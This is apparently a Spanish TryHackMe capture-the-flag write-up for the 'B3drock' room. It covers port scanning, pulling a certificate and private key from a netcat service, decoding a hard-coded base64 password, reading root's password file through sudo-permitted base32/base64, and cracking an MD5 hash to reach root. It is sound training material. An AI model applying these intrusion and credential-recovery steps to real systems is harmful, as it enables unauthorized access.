<div align="center">
    <img src="./assets/bedrock.png" width="300" height="400">
</div>

<div align="center">

# B3drock<!-- omit in toc -->
<!-- Fácil-#228B06 | Media-#BFA907 | Difícil-#A62100 -->
![TryHackMe](https://img.shields.io/badge/Plataforma-TryHackMe-A20606)
![Fácil](https://img.shields.io/badge/Dificultad-Fácil-228B06)

</div>

<br>

<div align="center">

| | |
|---|---|
| **Tags** | [**Information Disclosure**, **Sensitive Data Exposure**, **Security Misconfiguration**] |

</div>

## Índice <!-- omit in toc -->

- [Escaneos](#escaneos)
- [Investigando servicio Web](#investigando-servicio-web)
- [Shell con barney](#shell-con-barney)
- [Shell con fred](#shell-con-fred)
- [Shell con root](#shell-con-root)

<br>

*No sabía que los nombres reales de "Pedro" y "Pablo" en inglés eran "Fred" y "Barney", no sé por qué cambiar los nombres si con la traducción bastaba.*

<br>

### Escaneos

```shell
nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.112.144.183 -oG target.log
```

```log
# Nmap 7.95 scan initiated Fri Oct 30 20:28:20 2026 as: nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv -oG target.log 10.112.144.183
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.112.144.183 ()	Status: Up
Host: 10.112.144.183 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 4040/open/tcp//yo-main///, 9009/open/tcp//pichat///, 54321/open/tcp/////	Ignored State: closed (65530)
# Nmap done at Fri Oct 30 20:28:34 2026 -- 1 IP address (1 host up) scanned in 13.86 seconds
```
<br>

```shell
nmap -p22,80,4040,9009,54321 -sV -sC 10.112.144.183 -oN openPorts.log
```

<br>

Puedes ver el escaneo exhausivo haciendo [click aquí](./assets/openPorts.log)

<br>

### Investigando servicio Web

En efecto tenemos una redirección (*en mi caso Firefox me pide aceptar los riesgos de seguridad*), tenemos un mensaje escrito por **Barney** diciendo que no sabe qué es una bbdd y que **Bamm Bamm** intentó configurar una *SQL Database* pero no la ve corriendo, que le dijo que era del "baño" y sobre los `9000`, así que intentaremos en el puerto `9009` con `nc`

<div align="center">
    <img src="./assets/sec-risk.png">
    <br>
    <em>Aceptando el riesgo del navegador</em>
    <br><br>
    <img src="./assets/http-welc.png">
    <br>
    <em>Acceso a la página inicial</em>
</div>

<br><br>

Nos conectamos a través de `nc` al socket escuchando en el puerto `9009` y encontraremos lo siguiente:

```
nc 10.112.144.183 9009


 __          __  _                            _                   ____   _____ 
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |     
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ <| |     
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____ 
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|
                                                                               
                                                                               


What are you looking for? 
Sorry, unrecognized request: ''

You use this service to recover your client certificate and private key
What are you looking for? certificate
Sounds like you forgot your certificate. Let's find it for you...

-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yNjEwMzAxOTE0NThaFw0yNzEwMzAxOTE0NThaMBgxFjAUBgNVBAMMDUJh
cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDkuYu/
7/DjP11EDLu6JTMjQluncwLIwxQ6bsVq81f7fumeXovviJ2Te6LcblbBc5eTq50k
RggkhZbbPcHX/s9kQFCbP9wHkrx/oLCMKbR0gtUL/f+T98RgSs20ZkD3TB5ugRMP
Tm4XIUgNdCaG7fWjNs42BM6NGSTRzKtZzdc2t7oeINSXienLyVWbb7v/aSyo6enC
+fw3ikcYkjKWEyv/lybITAzIbhHo4QLTjrvanoI9xG5/go9dh+IEAGAK4ZO2t+L2
a/6g6qfosboQsTR7/XUwHeO3aWYpqdvx5OyJ6ej7T/CcRqqJvUhoEGxUBF0Xb74X
5Dl3eNTEs2lCXu+xAgMBAAEwDQYJKoZIhvcNAQELBQADggEBALKOAGYbZY/kwitp
5UE/0AUNZreefYc9vQoEQAcV9ynAMvkM/t/KfGJhyiLj92AVLQD42Q8UxfVmZokn
pUNDcpgZDTOEbmEZSZXrYNeYZz/e/mwaMtiyCwRpIOM6Uwpp+Ne8DPJNtNYrAPlY
I+NvXCR6iDA9S9qru/5jdwEBEYeQSCjpWu3tA41Km4/MfNFD8R9YVMZIDm0+vRuH
cZHTsOFrVHUfIwMueIlMsdNkGIdTlvD3EcCw6v4zKFWb8Ir4Cpeok4vjqXNWHiGM
U2M06LQyX+OXRD0vVm3rJq5+gNQ8OQSGbYqCZDQT03vt8cAVFdDWJSRME6CoF3QZ
iuk+e8c=
-----END CERTIFICATE-----


What are you looking for? whoami
Sorry, unrecognized request: 'whoami'

You use this service to recover your client certificate and private key
What are you looking for? private key
Sounds like you forgot your private key. Let's find it for you...

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA5LmLv+/w4z9dRAy7uiUzI0Jbp3MCyMMUOm7FavNX+37pnl6L
74idk3ui3G5WwXOXk6udJEYIJIWW2z3B1/7PZEBQmz/cB5K8f6CwjCm0dILVC/3/
k/fEYErNtGZA90weboETD05uFyFIDXQmhu31ozbONgTOjRkk0cyrWc3XNre6HiDU
l4npy8lVm2+7/2ksqOnpwvn8N4pHGJIylhMr/5cmyEwMyG4R6OEC04672p6CPcRu
f4KPXYfiBABgCuGTtrfi9mv+oOqn6LG6ELE0e/11MB3jt2lmKanb8eTsieno+0/w
nEaqib1IaBBsVARdF2++F+Q5d3jUxLNpQl7vsQIDAQABAoIBABT/2A3SOLqUebqi
tKWdfrlxATs5evr1tii7PNLZ7qz/dPF+WriuQVFmG4jDdKGkPDlpmy7WYy7/ON9+
JwrusRnSMdRfI5NqbHYHSc5EkfXUgTztoAZ0zAnPNF2oubQ6v9yDaz2PhNoIyzW5
AUSIGnJWuM4K2O/pbBD7CoxfMrAqN6tM29snTYmyN70L019AUUE41gZS5PrJRxAf
Ged+TMGcHL68Kmkfhw8A+UIXyZzYoHS9nTn6G4ym1dHzj2G7JjpWhYYfS37vr+q/
LkWcSE53s/v8P3eQ6Xx+w6D2cifmzAdxFS4ih6wPuNikIW1cZ3VmsbSWn7xtGr+8
WUqi8gECgYEA+9pdKLG7shSbKK4ZDKQP8arHyX2r8MxXgX9kxC6xbXY4huhvnBdS
5IMIpeVJ6KltntSVfwuxzGoS2AQtKQHod5JGLY9r8MXKHVr5LB8CqpVNH54m2Wi/
FDvzYSjBw0rmPlV4V/g3ANdGOx/mTS+JdsDqPps702Z/mwY+pboJsZECgYEA6H2w
j8Yv38XTnm3Ny9wFb4OjoD4eNbkhwoSe5pJCdlb1Q+VwPT3EKax4aQ21Xzodjz0w
Cv9Edu5rncVkn5nc0YnMuHsW9c69CDdkA7h56aP54JTkC6JWX9Ll6czV71N7I5il
6yDnYUIrR/rm2nPALCoYycKsuX9Chms7U0voTCECgYAtXZccRm+V00pjmICgm0jX
8jhMnhuDo3s7s1PWVsbU/c+O1X2NM1JWIRhEsbmPdD1vt8E6AkRDmvPL/2yXD2Xt
a+bCPCxoUWhnw0RQ40EaswwSXu2GieypW2cqoCnO4MX6gnDL/8UAnMZkzgkw7Bgp
0PQg1NuA59yicwyD06/9UQKBgQCEXQro0Czxee/Bg0JnjhyKIKhH0xXgAEb4OAk/
vIWaWmfJABemxkOodkkXhnZ8gNnTc0KnAC46iAM9D+T5+N9/bLThUzL/P3Tf+Kk4
dQ7ztifNdPdgqEwEwk2jjrs+RokU+xN7ioAxHzsFABPuy3fdrRnvxKYR9iIp5WMh
SVY4AQKBgQCjnZiPt6m+55paM4BH2DSOTXpPWmFdTjMyoV8285LG+133r4b2Fu9C
KsxN4f8NMAl5QcI6rv3KungzPb8qbTRNCQYwYUjNNZpIytNkMsbBjeytimhBXwFe
Km4b3f8lOmUfh+MyAYVz21njARuj9sJhuR7ul2VF3O2Z7iJZPE2y+Q==
-----END RSA PRIVATE KEY-----
```

Entonces tenemos un certificado y una llave, pero ¿de quién?...

>[!NOTE]
>Si a esa conexión le pasamos el prompt `fred` obtendremos lo siguiente
>

```
What are you looking for? fred
                                                                                          
                                                                                          
                                                                                          
                                                                                          
                                                                                          
                                  .                                                       
                                 ..  .                                                    
                                 .....                                                    
                                   ..                                                     
                                                                                          
                                        .;llllllcc:;.                                     
                          ..             .dKKXXKXKk:..;oxxc.                              
                          .              .lKKXKKXKxccodx0KKk;                             
                                         ;OKXXKKKKOoox0kxOOxd,.                           
                              .:'.cd,  .cOKKKKKKX0o;lKW0oxOk:.                            
                             .l0kdOK0doOKKKKKKKKXO;  :Oxc;xx'                             
                            .ckxddkKKXXKKXKKKKK0KKd,'cdd;.';'''...                        
                           .:xloOKKKKKKKKKKKXXKOkOkkO0kddxkOOO0OOx;.                      
                           ;kO:,oOKXKKKKKKXKKKK0Okk0KKXXKKKKKXKKXKl.                      
                          .dKKOl,cOXKKKKOkxxxxxxxxokKXKKKKKKKKKKKk;                       
                         .l0XKXK00KK0kxxddkOO0000Olo0XKKXXXKKKKKOc.                       
                         ,kXKKKKKKKkdxkO0OdokO0000xlldO0KXXKKK0x;.                        
                        .oKKKKKKKKkdk000x;.;kO00000Oxoc:cooooc;.                          
                        ,kXKKKKKKKxdO00Odc..lkO0000000kl;lxxxo:.                          
                   ..'..,d0KKKKKKKkdO0000k, ..;dO000000Od:cx00Odc'.                       
                    .';;,,;cdOKKKXOdk0000Oc    .,lxO00000kc;lO000kl'.                     
                      .;cc:,',:oOK0dx00000x'      ..',cooolcoO00000k:.                    
                     ...':ccc:;',:oook00000o...''..   .:xOO00000000x;.                    
                     'lc'.,:cccc:;'.':xO000Ooc::clc;.   .:oxxO0000Oc.                     
                    .:ddo;..;cccccc:,'';ok000Okocc:c:,;:coxlck000Ol...                    
                   .'lo:cll;.';ccccccc:,',cdO0000OOOOO0000xcdO00Oo'.,.                    
                   .:o;':c:cc;.';:cc::ccc;'';:ok000000000OddO00Ol',:;.                    
                  .,oc'c00d:;cl;..,:;'',;cc:,'',cxO0000000O000k:',:;..                    
                  .:o,,kXKK0d:;;;;'.''...'';:::;'':dO0000000Od,.,,'..                     
                 .,oc'cKKKKKKOc';ccc;,'.,:;'''',;;,';okxolll;...'.                        
                 .:o,,kXKKXKKX0ooOdccooooddolc:;,''...',,,,;'.,ll;.                       
                 'll'c0XKKKKKKKKKKKOocldddddddoddo:..,:ccccc,'cddc.                       
                .;d:'dKKKKKKKKKKKKXXKxccoddo:,',ldl'':ccccc:.,oddo,                       
                .cd;,kXKKKKKKKKKKKXKXXd;cdo;.   .ldc'':ccc;''ldddd:.                      
               .;od;;kXKKKKKKKKKKKXKKXx;co;.     ,odl;'','.,ldddddl'                      
               .cdd;,kXKKKKKKKKKKKKKKXx;co,      'odo:.';;';odddooo;.                     
               'odd:,xXKKKKKKKKKKKKKKXd,:do;.    ,oo;.,:cc,':ddl'.'..                     
              .;dddc,oKXKKKKKKKKKKKKXKd,:dddlc;.'co;.,cccc:.,odl.                         
              .:dodo,c0XKKKKKKKKKKKKKKd,:ddddddooo;.,cccccc,.cdo'                         
              .,,.:o:;xKKKKKKKKKKKKKKKd,cddddddddc.'ccccccc;.,od;                         
                  'oo,c0KKXKKKKKKKKKKKo'cdddddddo,.:ccccccc:.'ldl'.::.                    
                  'od:,xKXKKKKKXKKKKXKl'cdddddddc.':;:cccccc'.cddoodl'                    
                  ,odo,c0XKKXKKKKKKKKKc'ldddddddc.',';cccccc,.:dddddo'                    
                 .:dddc,dKKKKKKXKKKKX0:,odo::lodc...':cccc::,.:dddddo,.                   
               .,:odddo;:kKXXKKXKKKKXk;;oc' ..:doc,.'cccc:,,;.:dddddo;.                   
               'lddddddl;lKKKKKKKKKKKd':c.    'lddc.'cccc:..''cdddlcc,.                   
               .:dl::clo:l0KKKKXKKKK0c':.     .cddl.'cccc,''.,lddd;.                      
               .,o::kxlcd0KKKKKKKKXKx,;l,.    .cddo,':cc:';olldddd;                       
                .l::kXKKKXKKKXKKKKK0c,ldol:,'.,ldddc';cc,'cdddddddc.                      
                .,;;ldkOO0KKKKKKKKKo,cdddddddddddddo;';,':ddddddddo,                      
                 .'oOkxxkOKKKKKKXKd;:dddddddddddddddo:;;cdddddddddd;.                     
                 ..:kKXXK0kdkKKK0d,'ldddddddddddddddddddddddddddddl'.                     
                  ':clddlldkKX0xcc:;ododddddddddooddddddddccoddddo,.                      
                  .colc:,:dOOdc;;c:cl;:odddddddc,,cdddddoc,,:dddd:.                       
                  .,odoc;lo;;:loddoc:,;oddddoo:;lc,ldddo:ckd;:odc.                        
                   .:c,..d0c;odddl:lOx;:oddo:'.cKOc,ldo:cOXKx:;:'.                        
                    ..  .:0k;;ooc:o0XKd;:oo:...oKXOl;:;lOKKKKk,..                         
                         'xKkl::ckKKXKKkl::cc;;dKKKKkdx0XKKKKd.                           
                         .lKXKOO0KKKXKKKKOO0d,;xKKKKKKKKKKKX0:.                           
                          ,kXKKKKKKKKKKKKKXKo';kXKKKKKKKKKKKx'                            
                          .lKKKKKKKKKKKKKKKKl.:OXKKKKKKKKKKKc.                            
                           ,kXKKKKKKKKKKKKKKl.:OXKKKKKKKKKKk,                             
                           .lKXKKKKKKKKKKKXKc.:OXKKKKKKKKKKo.                             
                            ,kKKKKKKKKKKKKXKc.:OXKKKKKKKKXO;                              
                            .c0XKKKKKKKKKKX0c.:OKKKKKXKKKKx,                              
                            .c0KKKKKKKKKKK0Oc.:kOKXKKKKKKK0koc,..                         
                         .;lx0KKKKKKKKKKKOdx:.ckk0KXKXKKXKKXKK0ko:'.                      
                     ..:okKKKKKKKKKKKKKK0kkOc.l000KKKKKKXKKXKKKKKK0xl:,,'.                
               .'''.;dOKXKKKKKKXKKKKKKKXKKX0c'oKXKKKKKKKXXKKKKK0Okkxdodxkl.               
              'dkoodkxxkkk0KKXKKKKKKKKKKXK0d,.:xk0KKKKKKKKKKKKKx::lolcdl:,.               
              ,c:lkkl:loolxKKKKKKKKKXXKOdc,.   ..',:ldkOKKXXK0K0OOKKo;l:.                 
               .,xXk:d0kkk0KKKKXXKKOxl:'.             .';:cc:;lxkxd:...                   
                .,c:'c0XXXKOo::cc:;..                          ...                        
                     .,cll:'.                                                             

```

<br><br>

### Shell con barney

Sin embargo ahora que tenemos un **certificado.pem** y una **key.pem** podemos acceder por el puerto `54321` con `openssl` (*no puse la salida completa porque al conectar es realmente extensa, pero sí los comandos una vez hagamos la conexión*) 

```
openssl s_client -connect 10.112.144.183:54321 -cert cert_found.pem -key cert_key.key

# ...

---
read R BLOCK
Welcome: 'Barney Rubble' is authorized.
b3dr0ck> ls
Unrecognized command: 'ls'

This service is for login and password hints
b3dr0ck> whoami
Current user = 'Barney Rubble' (valid peer certificate)
b3dr0ck> pwd          
Unrecognized command: 'pwd'

This service is for login and password hints
b3dr0ck> certificate
Unrecognized command: 'certificate'

This service is for login and password hints
b3dr0ck> help
Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
```

<br>

Mientras mantengo esa conexión con esa ayuda que nos dan, intento conectarme por el servicio `SSH` y conseguimos entrar como **Barney**:

```
❯ ssh barney@10.112.144.183
barney@10.112.144.183's password: 
barney@ip-10-112-144-183:~$ export TERM=xterm
barney@ip-10-112-144-183:~$ whoami;id;groups;pwd
barney
uid=1001(barney) gid=1001(barney) groups=1001(barney)
barney
/home/barney
barney@ip-10-112-144-183:~$ ls -la
total 28
drwxr-xr-x 3 barney barney 4096 Apr 30  2022 .
drwxr-xr-x 6 root   root   4096 Oct 30 19:14 ..
-rw------- 1 barney barney   38 Apr 29  2022 barney.txt
lrwxrwxrwx 1 barney barney    9 Apr 28  2022 .bash_history -> /dev/null
-rw-r--r-- 1 barney barney  220 Apr 10  2022 .bash_logout
-rw-r--r-- 1 barney barney 3771 Apr 10  2022 .bashrc
drwx------ 2 barney barney 4096 Apr 30  2022 .cache
-rw-r--r-- 1 root   root      0 Apr 30  2022 .hushlogin
-rw-r--r-- 1 barney barney  807 Apr 10  2022 .profile
lrwxrwxrwx 1 root   root      9 Apr 29  2022 .viminfo -> /dev/nul
```

<br>

Obtenemos el primer flag **barney.txt**, ahora veremos qué permisos tiene **Barney** para ejecutar como **sudo** en esta máquina.

```
barney@ip-10-112-144-183:~$ sudo -l
[sudo] password for barney: 
Matching Defaults entries for barney on ip-10-112-144-183:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User barney may run the following commands on ip-10-112-144-183:
    (ALL : ALL) /usr/bin/certutil
```

<br>

Además de lo anterior, encontré donde se generan los certificados

```
barney@ip-10-112-144-183:~$ file $(which certutil)
/usr/bin/certutil: symbolic link to /usr/share/abc/bin/certutil
barney@ip-10-112-144-183:~$ file /usr/share/abc/bin/certutil 
/usr/share/abc/bin/certutil: Node.js script, ASCII text executable
barney@ip-10-112-144-183:~$ cat /usr/share/abc/bin/certutil 
#!/usr/bin/env node


require('../dist/certs');

barney@ip-10-112-144-183:~$ find / -iname "certs" 2>/dev/null
/snap/core20/2501/etc/ssl/certs
/snap/core20/2501/usr/lib/ssl/certs
/snap/core20/2599/etc/ssl/certs
/snap/core20/2599/usr/lib/ssl/certs
/etc/ssl/certs
/usr/share/abc/certs
/usr/lib/ssl/certs
/usr/src/linux-headers-5.15.0-139-generic/certs
/usr/src/linux-headers-5.15.0-138-generic/certs
/usr/src/linux-hwe-5.15-headers-5.15.0-138/certs
/usr/src/linux-hwe-5.15-headers-5.15.0-139/certs
barney@ip-10-112-144-183:~$ find / -iname "dist" 2>/dev/null
/snap/core20/2501/usr/share/python3/dist
/snap/core20/2599/usr/share/python3/dist
/usr/share/vim/vim81/autoload/dist
/usr/share/vim/vim81/pack/dist
/usr/share/abc/dist
/usr/share/abc/node_modules/es6-promisify/dist
/usr/share/abc/node_modules/md5/dist
/usr/share/python3/dist
/usr/lib/node_modules/npm/node_modules/agent-base/dist
/usr/lib/node_modules/npm/node_modules/@tootallnate/once/dist
/usr/lib/node_modules/npm/node_modules/postcss-selector-parser/dist
/usr/lib/node_modules/npm/node_modules/http-proxy-agent/dist
/usr/lib/node_modules/npm/node_modules/https-proxy-agent/dist
/usr/lib/node_modules/npm/node_modules/socks-proxy-agent/dist
/usr/lib/node_modules/npm/node_modules/diff/dist
/usr/lib/node_modules/corepack/dist
barney@ip-10-112-144-183:~$ ls -la /usr/share/abc/dist/
certs.js   server.js  
```

<br>

Continuando con lo que nos interesa, podemos listar los certificados que existen y vemos que no hay alguno que nos interese, tendríamos que crear un nuevo certificado...

<br>

>[!TIP]
>https://www.linux.org/docs/man1/certutil.html
>
>https://linuxcommandlibrary.com/man/certutil
>

<br>

```
barney@ip-10-112-144-183:~$ sudo /usr/bin/certutil -L

Cert Tool Usage:
----------------

Show current certs:
  certutil ls

Generate new keypair:
  certutil [username] [fullname]
```

<br>

*NOTA: Usen los comandos: `sudo /usr/bin/certutil -L -n ls` o también `sudo /usr/bin/certutil -L -n certutil`*

<br>

### Shell con fred

Sin embargo, leyendo un poco el script `server.js` pude notar algo bastante curioso y es que se puede encontrar la clave de **fred** codificada en `base64`

```
cat /usr/share/abc/dist/server.js | tr ';' '\n' | grep -i "fred*"
var FRED_SEC=dd("V1dGaVltRkVZV0ppWVVRd01EQXdJUW89Cg==")
if(/fred/i.test(cmd)){res=_this.getAsciiArt("fred.txt")}else if(/login|cred(entials)?|help|setup|connect|how|secure|port/i.test(cmd)){res="Looks like the secure login service is running on port: ".concat(SEC_PORT,"\n\nTry connecting using:\nsocat stdio ssl:MACHINE_IP:").concat(SEC_PORT,",cert=<CERT_FILE>,key=<KEY_FILE>,verify=0")}else if(/public|client|cert/i.test(cmd)){var cert=_this.getCredsFile("barney")
if(/barney/i.test(peer)){sec_1=BARNEY_SEC}else if(/fred/i.test(peer)){sec_1=FRED_SEC}socket.write(safe_1.default.green("Welcome: '".concat(peer,"' is authorized."))+SEC_PROMPT)
if(/fred/i.test(cmd)){res=_this.getAsciiArt("fred.txt")}else if(/gazoo/i.test(cmd)){res=_this.getAsciiArt("gazoo.txt")}else if(/login/.test(cmd)){res="Login is disabled. Please use SSH instead."}else if(/user|whoami/.test(cmd)){res="Current user = '".concat(peer,"' (valid peer certificate)")}else if(/pass(word)?|hint|help|cred(s|entials)?/i.test(cmd)){res="".concat(dd("VUdGemMzZHZjbVFnYUdsdWREbz0=")," ").concat(sec_1.trim()," (user = '").concat(peer,"')")}else{res="Unrecognized command: '".concat(cmd,"'\n\n").concat(dd("VkdocGN5QnpaWEoyYVdObElHbHpJR1p2Y2lCc2IyZHBiaUJoYm1RZ2NHRnpjM2R2Y21RZ2FHbHVkSE09"))}res+=SEC_PROMPT
console.log("Generating Fred KeyPair ...")
pem_1.default.createCertificate(getSignedOptions("Fred Flintstone",serverData.serviceKey,serverData.certificate),(function(fredErr,fredKeys){if(fredErr)return cb(fredErr)
writeKeysSync("fred",fredKeys)
```

<br>

```
❯ echo 'V1dGaVltRkVZV0ppWVVRd01EQXdJUW89Cg==' | base64 -d
WWFiYmFEYWJiYUQwMDAwIQo=
❯ echo 'V1dGaVltRkVZV0ppWVVRd01EQXdJUW89Cg==' | base64 -d | base64 -d
[REDACTED]
```

<br>

Tenemos la contraseña de **fred** así que entraremos por el puerto `22` pero con la cuenta de **fred**.

```
❯ ssh fred@10.112.144.183
fred@10.112.144.183's password: 
fred@ip-10-112-144-183:~$ export TERM=xterm
fred@ip-10-112-144-183:~$ whoami;id;groups;pwd
fred
uid=1000(fred) gid=1000(fred) groups=1000(fred),24(cdrom),30(dip),46(plugdev),1002(help)
fred cdrom dip plugdev help
/home/fred
```

<br>

Conseguimos el flag de **fred.txt**

<br>

### Shell con root

Ahora que somos **fred** busquemos cualquier cosa que nos pueda ayudar...

```
fred@ip-10-112-144-183:~$ sudo -l
Matching Defaults entries for fred on ip-10-112-144-183:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on ip-10-112-144-183:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
fred@ip-10-112-144-183:~$ sudo /usr/bin/base32 /root/pass.txt
JRDEWRKDGUZFUS2SINMFGV2LLBEVUVSVGQZUWSSHJZGVQVKSJJJUYRSXKZJTKMSPKBFECWCVKRGE
4SSKKZKTEUSDK5HEER2YKVJFITCKLJFUMU2TLFFQU===
fred@ip-10-112-144-183:~$ sudo /usr/bin/base32 /root/pass.txt | base32 -d
LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK
fred@ip-10-112-144-183:~$ sudo /usr/bin/base32 /root/pass.txt | base32 -d | base32 -d
YTAwYTEyYWFkNmI3YzE2YmYwNzAzMmJkMDVhMzFkNTYK
fred@ip-10-112-144-183:~$ sudo /usr/bin/base32 /root/pass.txt | base32 -d | base32 -d | base64 -d
a00a12aad6b7c16bf07032bd05a31d56
```

<br>

Ahora en nuestra máquina: 

```
Analyzing 'a00a12aad6b7c16bf07032bd05a31d56'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 
[+] Skype 
[+] Snefru-128 
[+] NTLM 
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x 
```

<br>

Para no gastar tantos recursos crackeando vamos a [crackstation](https://crackstation.net/) y crackeamos esto

<div align="center">
    <img src="./assets/crackstation.png" width="700" height="400">
    <br>
    <em>Hash crackeado</em>    
</div>

<br><br>

```
fred@ip-10-112-144-183:~$ su root
Password: 
root@ip-10-112-144-183:/home/fred# whoami
root
root@ip-10-112-144-183:/# cd 
root@ip-10-112-144-183:~# pwd
/root
root@ip-10-112-144-183:~# ls -la
total 36
drwx------  5 root root 4096 Jul  5  2025 .
drwxr-xr-x 19 root root 4096 Oct 30 19:14 ..
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Jul  5  2025 .cache
-rw-------  1 root root   73 Apr 11  2022 pass.txt
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-------  1 root root   38 Apr 29  2022 root.txt
drwx------  3 root root 4096 Apr  9  2022 snap
drwx------  2 root root 4096 Apr 26  2025 .ssh
-rw-rw-rw-  1 root root    0 Jul  5  2025 .viminfo
root@ip-10-112-144-183:~# cat root.txt
THM{[REDACTED]}
```

<br>

---

En este punto me gustaría añadir que me parece que el movimiento lateral de **barney** a **fred** era a través de la explotación del "binario" `certutil`, y como se descubrió de otra forma la contraseña del usuario **fred** es necesario destacar la importancia de revisar lo que estamos por ejecutar ya que en este caso estuvo mucho más rápido descubriendo la contraseña de esta forma. 

La anécodta de cómo descubrí la contraseña fue que cuando hice el comando `ls -l $(which certutil)` y seguí el **symlink** hasta la ruta donde estaba el archivo original, estaba acompañado de un archivo `server.js`, al intentar leer un poco ese archivo para ver de qué se trataba vi que aparecía la palabra '**pem**' múltiples veces, lo que me llevó a pensar al inicio, que debía crear un certificado como **fred** para ingresar de esa forma, para mi sorpresa la clave estaba directamente en el archivo codificada en `base64`.

---

<div align="center">

**HellHound DevSecOps**<br>
*Ciberseguridad, Análisis de Sistemas & Reports*

[![GitHub](https://img.shields.io/badge/GitHub-181717?style=flat&logo=github&logoColor=white)](https://github.com/xhellhoundx/)
[![YouTube](https://img.shields.io/badge/YouTube-FF0000?style=flat&logo=youtube&logoColor=white)](https://www.youtube.com/@H3llH0undDSO)
[![X](https://img.shields.io/badge/X-000000?style=flat&logo=x&logoColor=white)](https://x.com/hellhoundso)

</div>
